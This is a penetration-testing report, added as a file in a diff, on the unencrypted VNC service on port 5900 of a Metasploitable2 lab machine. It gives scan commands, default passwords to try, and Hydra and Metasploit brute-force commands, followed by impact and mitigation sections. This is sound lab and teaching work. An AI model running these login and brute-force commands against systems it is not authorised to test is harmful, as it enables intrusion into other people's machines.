@@ -1,0 +1,92 @@
+Penetration Testing Report: Metasploitable2 - Port 5900 (VNC)
+
+
+Target System  : Metasploitable2 (Lab Environment)
+Target IP      : 192.168.1.101
+Test Date      : 05-06-2025
+Tested By      : [me]
+
+
+--------------------------------------------------------------
+1. Port 5900 (VNC) - Unauthenticated Access & Weak Passwords
+--------------------------------------------------------------
+
+Service         : VNC (Virtual Network Computing)
+Port            : 5900/tcp
+Status          : Open
+Protocol Version: VNC Protocol 3.3
+Tools Used      : Nmap, vncviewer, Hydra, Metasploit
+
+Scan Command:
+nmap -sV -p 5900 192.168.1.101
+
+Scan Result:
+  PORT     STATE SERVICE VERSION
+  5900/tcp open  vnc     VNC (protocol 3.3)
+
+--------------------------------------------------------------
+Vulnerability Overview
+--------------------------------------------------------------
+
+- VNC is running an outdated and insecure protocol (3.3).
+- May not require a password or may use weak/default credentials.
+- No encryption in use: session data (mouse, keyboard, screen) can be intercepted.
+- VNC allows full desktop access.
+
+--------------------------------------------------------------
+Manual Exploitation
+--------------------------------------------------------------
+
+Step 1: Connect using VNC viewer:
+vncviewer 192.168.1.101:0
+
+Step 2: Try default passwords:
+- password
+- admin
+- 123456
+- (leave blank)
+
+Step 3: Successful login grants full GUI access to the system.
+
+--------------------------------------------------------------
+Automated Password Brute-Force (Optional)
+--------------------------------------------------------------
+
+Using Hydra:
+hydra -P /usr/share/wordlists/rockyou.txt -t 4 -f 192.168.1.101 vnc
+
+Using Metasploit:
+1. Start Metasploit: msfconsole
+2. Load module: use auxiliary/scanner/vnc/vnc_login
+3. Set target: set RHOSTS 192.168.1.101
+4. Set password file: set PASS_FILE /usr/share/wordlists/rockyou.txt
+5. Run: run
+
+--------------------------------------------------------------
+Impact
+--------------------------------------------------------------
+
+- Full GUI-based control of the target machine.
+- Allows opening terminals, launching programs, modifying files.
+- Total system compromise is possible.
+- Sessions and input/output are unencrypted and sniffable on the network.
+
+--------------------------------------------------------------
+Mitigation Recommendations
+--------------------------------------------------------------
+
+- Disable the VNC service if not required.
+- Use a strong VNC password.
+- Restrict access using firewalls.
+- Never expose VNC directly to the internet.
+- Use encrypted tunneling (e.g., SSH, VPN) if remote access is needed.
+
+--------------------------------------------------------------
+Conclusion
+--------------------------------------------------------------
+
+The VNC service running on port 5900 of Metasploitable2 (192.168.1.101) is vulnerable due to:
+
+- Weak or missing authentication
+- No encryption
+- Exposure of full desktop access
